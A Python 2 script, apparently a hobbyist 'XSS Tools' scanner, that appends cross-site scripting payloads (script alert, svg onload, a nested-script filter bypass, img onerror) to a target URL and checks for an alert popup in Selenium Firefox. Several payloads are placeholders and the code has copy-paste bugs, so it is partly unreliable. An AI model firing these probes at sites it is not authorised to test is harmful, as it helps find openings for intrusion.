import os
import sys
import time
import random
import requests
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

red = '\33[31m'
yellow = '\33[33m'
green = '\33[92m'
blue = '\33[34m'

print str(green+"""
[============ Programmed By AbdXSlayer ============]
                   [XSS Tools]
            Facebook : Abderrahmane Bourri
            Github : ABDXH4K3r
            Instagram : abderrahman_bourri
            Mail : As8apple@gmail.com
    (You Should read the README File for Usage)
[==================================================]""")
time.sleep(2)

def clear():
    os.system('clear')
def stop():
    exit()

link = sys.argv[1]
opt = sys.argv[2]
easyscript = ("'<script>alert('XSS')</script>")
mediumscript = ["<svg onload='XSS'>",'<IMG """><script>alert("xss")</script>">"',"<scri<script>pt>JS Code</script>",'"><img src="link" onerror=Js code;']
browser = webdriver.Firefox()
if opt=='-easy':
    clear()
    r = requests.get(link+easyscript)
    browser.get(link+easyscript)
    if r.status_code==200:
        try:
            WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')
            alert = browser.switch_to.alert
            alert.accept()
            print("alert accepted")
            print str(green+'[+] Success !,'+blue+'Website Has XSS level easy.'+"XSS By "+easyscript)
        except TimeoutException:
            print("no alert")
            print str(red+'[-] Website Xss vulnerability is high level,'+yellow+'try "-medium" or "high" option.')

if opt=='-medium':
    clear()
    browser.get(link)
    one = requests.get(link+"'"+mediumscript[0])
    browser.get(link+"'"+mediumscript[0])
    if one.status_code == 200:
        try:
            WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')
            alert = browser.switch_to.alert
            alert.accept()
            print("alert accepted")
            print str(green+'[+] Success !,'+blue+'Website Has XSS level easy.'+"XSS By "+easyscript)
        except TimeoutException:
                two = requests.get(link+"'"+mediumscript[1])
                if two.status_code == 200:
                    browser.get(link+"'"+mediumscript[1])
                    try:
                        WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                               'Timed out waiting for PA creation ' +
                                               'confirmation popup to appear.')
                        alert = browser.switch_to.alert
                        alert.accept()
                        print("alert accepted")
                        print str(green+"Success !"+'Xss By '+mediumscript[1])
                    except TimeoutException:
                        print("no alert")
                        three = requests.get(link+"'"+mediumscript[2])
                        try:
                            WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                                       'Timed out waiting for PA creation ' +
                                                       'confirmation popup to appear.')
                            alert = browser.switch_to.alert
                            alert.accept()
                            print("alert accepted")
                            print str(green+"Success !"+'Xss By '+mediumscript[2])
                        except TimeoutException:
                            print("no alert")
                            browser.get(link+"'"+mediumscript[3])
                            four = requests.get(link+"'"+mediumscript[3])
                            try:
                                WebDriverWait(browser, 3).until(EC.alert_is_present(),
                                                           'Timed out waiting for PA creation ' +
                                                           'confirmation popup to appear.')
                                alert = browser.switch_to.alert
                                alert.accept()
                                print("alert accepted")
                                print str(green+"Success !"+'Xss By '+mediumscript[1])
                            except TimeoutException:
                                print("no alert")
                                print str(red+'[-] Failed !, Medium Xss is not valid for this website. We Are working for The high option...')

if opt=='-high':
    print str(yellow+"Soon...")
